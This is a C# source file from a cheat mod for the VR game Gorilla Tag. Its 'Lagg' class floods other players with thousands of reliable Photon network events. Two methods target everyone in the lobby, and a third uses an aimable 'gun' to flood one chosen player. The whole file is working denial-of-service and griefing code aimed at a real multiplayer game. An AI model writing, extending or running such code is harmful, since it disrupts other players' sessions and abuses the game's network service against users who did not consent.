using System;
using System.Text;
using System.Collections.Generic;
using UnityEngine;
using Photon.Pun;
using Photon.Realtime;
using ExitGames.Client.Photon;
using static Delta.Mods.GunRenderer;

namespace Delta.Mods 
{
  internal class Lagg 
  {
    private static NetPlayer player = null;
    public static void LagAllV1Mod() 
    {
      for(int x = 0;x<9999;x++) 
      {
        PhotonNetwork.NetworkingClient.OpRaiseEvent(200, new object[] 
        {
          -357418518,
          76
        },
        new RaiseEventOptions 
        {
          CachingOption = EventCaching.DoNotCache,
          Receivers = ReceiverGroup.Others
        },
        SendOptions.SendReliable
        );
        PhotonNetwork.SendAllOutgoingCommands();
      }
    }
    public static void LagAllV2Mod() 
    {
      for(int x = 0;x<800;x++) 
      {
        PhotonNetwork.NetworkingClient.OpRaiseEvent(200, new object[] 
        {
          -357418518,
          76
        },
        new RaiseEventOptions 
        {
          CachingOption = EventCaching.DoNotCache,
          Receivers = ReceiverGroup.Others
        },
        SendOptions.SendReliable
        );
        PhotonNetwork.SendAllOutgoingCommands();
      }
    }
    public static void LagGunV2Mod() 
    {
      if(ControllerInputPoller.instance.rightGrab) 
      {
        RaycastHit hit;
        var GunData = RenderGun(GorillaTagger.Instance.rightHandTransform, out hit);
        RaycastHit Ray = GunData.Ray;
        GameObject NewPointer = GunData.NewPointer;
        VRRig playertarget = hit.collider?.GetComponentInParent<VRRig>();
        if(playertarget != null) 
        {
          player = Global.GetNetPlayer(playertarget);
        }
        
        if(ControllerInputPoller.instance.rightControllerIndexFloat >= 0.5f) 
        {
          for(int x = 0;x<800;x++) 
          {
            PhotonNetwork.NetworkingClient.OpRaiseEvent(200, new object[] 
            {
              -357418518,
              76
            },
            new RaiseEventOptions 
            {
              CachingOption = EventCaching.DoNotCache,
              TargetActors = new int[] { player.ActorNumber }
            },
            SendOptions.SendReliable
            );
            PhotonNetwork.SendAllOutgoingCommands();
          }
        }
      }
    }
  }
}
